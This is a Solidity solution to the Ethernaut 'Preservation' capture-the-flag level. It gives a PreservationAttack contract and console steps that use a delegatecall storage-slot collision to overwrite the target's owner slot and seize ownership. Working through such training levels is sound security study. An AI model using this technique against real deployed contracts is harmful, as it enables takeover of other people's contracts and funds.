/*
Tools needed for this level:
- Console
- Remix IDE

1.- Deploy this contract (PreservationAttack) with Remix IDE using injected web3 environment.

2.- Execute the setFirstTime() function of Ethernaut's Preservation contract via console,
    passing the PreservationAttack contract address.
    This will allow us to make a "delegatecall" on PreservationAttack and modify Ethernaut's 
    Preservation contract storage where "owner" is stored (slot[2]):
        await contract.setFirstTime("replace_with_PreservationAttack__contract_address")

3.- Execute the setFirstTime() function again, passing any value as the parameter:
        await contract.setFirstTime("0")

4.- Check if we are now owners of the contract:
        await contract.owner()
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationAttack {
	address public timeZone1Library;
	address public timeZone2Library;
	address public owner;

	function setTime(uint256 _time) public returns (uint256) {
		// This implementation will change value of slot[2] in storage
		// on the calling contract, which will be Ethernaut's Preservation
		owner = msg.sender;
		return _time;
	}
}
